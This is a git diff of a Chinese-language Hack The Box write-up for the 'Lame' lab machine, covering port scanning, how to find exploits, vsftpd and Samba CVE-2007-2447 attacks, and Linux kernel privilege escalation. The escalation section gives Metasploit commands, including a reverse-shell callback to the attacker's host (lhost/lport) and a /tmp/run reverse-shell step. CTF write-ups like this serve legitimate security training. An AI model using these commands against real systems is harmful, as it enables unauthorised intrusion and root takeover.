@@ -8,6 +8,13 @@ category: Hack The Box
 
 ![](./1.png)
 
+## 0x00 写在前面
+
+Lame 比较简单，篇幅比较啰嗦，旨在：
+1. 讲清楚步骤和思路。
+2. 尽可能把可以利用的点走一遍，所以一处服务会有多种打法，虽然有的没成功ahahaha。
+3. 算是一点总结提升。
+
 ## 0x01 信息收集
 
 上来第一件事先扫下开放端口，刚开始先用脚本把全端口跑一遍。
@@ -51,16 +58,23 @@ nmap -sU -p- -oA nmap/udp 10.10.10.3
 
 ## 0x02 根据端口逐一突破
 
+### 0、找 EXP
+
+根据不同的端口服务去找利用方式，如何又快又准地在茫茫多的 exp 中找到匹配的那个，**找 EXP 的姿势很关键**。
 对于每个端口，应该根据 `服务和对应版本`，搜寻是否有已公开的利用方式，搜寻的方式可以是：
 - **www.google.com.hk** 
-- **`searchsploit` / www.exploit-db.com**
-- **kali 中的相应扫描器**
-  - `nmap script`  
-  - `msf auxiliary/exploit`
+- `searchsploit {keyword}` 关键字一般取漏洞描述，比如 `privilege` `samba`*
+- **kali 中各种扫描器**
+  - `nmap script: ll /usr/share/nmap/scripts/ | grep {keyword}` 关键字可以是 cve 也可以是 漏洞描述，比如 `cve` `samba`
+  - `msf: search {keyword}` 关键字可以是 cve 也可以是 漏洞描述，比如 `cve` `samba`
 
-**建议先从 google 找，再用 `cve`、`服务名`、`版本` 等关键字在 `kali` 里搜**，比较准。因为搜索引擎的检索比较可以智能地匹配你的关键字，而且可能有现成的利用方式。kali 里就没这么智能，关键字不匹配则比较难搜出来，即使本来就集成的 exp。
+#### ！建议先翻下 `Google`，再用 `cve`、`服务名`、`版本`、`描述` 等关键字在 `kali` 里搜。
+这样比较准。因为搜索引擎的检索比较可以智能地匹配你的关键字，而且可能有现成的利用方式。kali 里就没这么智能，关键字不匹配则比较难搜出来，即使本来就集成的 exp。
 
-当然你也可以直接 `kali` 里搜 `服务名` 或者 `版本`，看看说明，逐一筛选 `探测脚本` 或 `可用 exp`，能用的直接用，没找到的可以在 google 找下，可能已经公开 exp 但尚未集成 kali，这时候需要 `手工利用`。
+#### ！当然你也可以直接 `searchexploit / nmap / msf` 搜一大堆再挨个找。
+看看说明，逐一筛选 `探测脚本` 或 `可用 exp`，能用的直接用，没找到的可以在 google 找下，可能已经公开 exp 但尚未集成 kali，这时候需要 `手工利用`。
+
+#### ！Google、Searchsploit、Nmap/MSF 三位一体漏洞库查找结果融合，总会有你想要的。
 
 ### 1、Port 21
 google 一下发现 `vsftpd v2.3.4` 有公开 RCE，是开发哥写的后门，康康 `nmap` 有无脚本，路径在 `/usr/share/nmap/scripts/*`。
@@ -99,7 +113,6 @@ nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
 - 3.0.x ~3.6.3: CVE-2012-1182
 - 3.5.0 ~ 4.4.14: cve-2017-7494 pipename
 - 3.2.20: cve-2007-2447，username_map_script RCE
-- 3.x: smbclient 后门
 
 MSF 开起来，搜关键字 `1182`，找到这个，该 exp 支持 `check`，配置参数，对每个 `target` 都 check 一下，报无法利用。
 ``` java
@@ -169,7 +182,7 @@ id
 ![](./11.png)
 
 #### 姿势二：手操 N 键 getshell
-手动利用先看下漏洞原理。
+msf 只是把整个利用过程脚本自动化了，如果手动利用应该怎么做呢？先看下漏洞原理。
 > **Samba 中负责在 SAM 数据库更新用户口令的代码未经过滤便将用户输入传输给了 /bin/sh。如果在调用 smb.conf 中定义的外部脚本时，通过对 /bin/sh 的 MS-RPC 调用提交了恶意输入的话，就可能允许攻击者以 nobody （匿名）用户的权限执行任意命令。[CVE-2007-2447](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447)**
 
 所以利用条件有 3 个：
@@ -215,11 +228,21 @@ smbclient //10.10.10.3/tmp                            # 匿名登录、连接共
 ls rootfs/home/makis/user.txt                         # 找到 flag
 get rootfs/home/makis/user.txt                        # 下载到本地查看，获取 flag
 ```
+> *smbclient 如果报错：`protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED`*
+> *可尝试加参数：--option='client min protocol=NT1。但我是加了两行配置解决的：*
+> ``` ini
+> vi /etc/samba/smb.conf
+> [global]
+> client min protocol = CORE
+> client max protocol = SMB3
+> ```
+
+
 ![](./19.png)
 > #### TODO: 这个姿势目前没拿到 root，记个待办。
 > - 匿名登录为普通用户权限，无法访问 `root/*` 下的文件，所以看不到 root.txt
 > - 尝试挂载到本地 `mount -t nfs 10.10.10.3:/tmp /tmp/rootme` `smbmount //10.10.10.3/tmp  /tmp/rootme -o rhh` 没用，应该姿势没对 [mount](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) [smbmount](https://blog.csdn.net/eager7/article/details/8365458)
-> - 尝试 `上传/写入公钥` 没成功，感觉也是姿势不对 [使用的命令](https://blog.csdn.net/punk_lover/article/details/40040967)
+> - 尝试 `上传/写入公钥` 没成功，感觉也是姿势不对。[使用的命令](https://blog.csdn.net/punk_lover/article/details/40040967)
 > 
 > 估计不需要什么提权操作，写入 `ssh 公钥`是突破口，烦死了，这个**有空再研究**。
 
@@ -233,14 +256,49 @@ msf 有 exp 可以直接 getshell。
 问题来了，拿到普通用户 `daemon` 权限，需要提权。查看内核版本为 `2.6.24-16-server`。
 
 ![](./23.png)
-尝试 [脏牛](https://www.exploit-db.com/exploits/40839) 和 [CVE-2008–0600](https://www.exploit-db.com/exploits/5093) 不成功。
 
+针对内核版本去找 exp。首先康康 `searchsploit Linux Kernel 2.6`。
+图就不放了，太多，搞死人，换个姿势。。。
+
+#### 姿势一
+刚刚不是有个 shell 嘛，用一个超勇的 `利用建议器`，来帮我们找出哪些 exp 可以用。这里能找出的 exp 必须是支持 `check` 的，不然它也没法扫描确认可以使用。
+
+首先退出会话，**升级 shell 为 meterpreter**，即 msf 的高级 shell。
+``` java
+background
+session -u {sessionId}
+```
+![](./24.png)
+调出建议器，设置好参数运行，它会通过会话在靶机上做 exp 检测，给出有效的漏洞列表，不完全准确，需要手工验证。
+``` java
+use post/multi/recon/local_exploit_suggester    # 使用建议器械
+session -u 4                                    # 设置刚刚升级的 sessionId
+exploit
+```
+![](./25.png)
+给出 5 个可以利用，先试试第一个。
+``` java
+use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
+set lhost 10.10.14.20
+set lport 4445
+set session 3
+exploit
+```
+配置完毕跑一下，可以看到 root 会话生成，并且可以访问 root.txt 获得 flag。
+> *如果会话无法生成：Reason: Die。升级最新版 msf 试试。*
+
+![](./26.png)
+
+#### 姿势二（TODO）
 尝试 [CVE-2009-1185](https://www.exploit-db.com/exploits/8572)。
-下载 exp，传到机器上编译 `gcc 1234.c -o 1234`，获取 netlink PID `cat /proc/net/netlink`，执行提权的时候，会运行 `/tmp/run`（得自己加一个反弹 shell 脚本，命名为 /tmp/run），反弹到 kali 上获取 `root-shell`。（TODO: 补图）
+利用流程：`searchexploit -m 8572.c`，传到机器上编译 `gcc 8572.c -o 8572`，获取 netlink PID `cat /proc/net/netlink`，执行提权的时候，会以 root 身份运行 `/tmp/run`（得自己加一个反弹 shell 脚本，命名为 /tmp/run），反弹到 kali 上获取 `root-shell`。
 
-还有一个可以用。总共试了5个，2个可用。
+或者用内置 exp: exploit/linux/local/udev_netlink，使用方式与上面一致。
 
-## 0x03 Catch The Flag
-翻文件，flag 一般在用户个人目录下，最后在 `/root/root.txt`、`/home/makis/user.txt` 找到 flag。
+然鹅两种方式都没成功，最后一步 run 始终没有执行，网上找了一下别人也是这么操作的。不想赖给环境，怀疑是 htb 方面把这个洞补了。。。
+有空再研究。
 
-![](./12.png)
+
+## 0x03 学到什么
+#### 1、保持全端口、双协议扫描，这是基础。
+#### 2、找 exp 的时候，利用收集到的信息（内核版本、OS 版本 等）缩小范围，更针对性地去找。
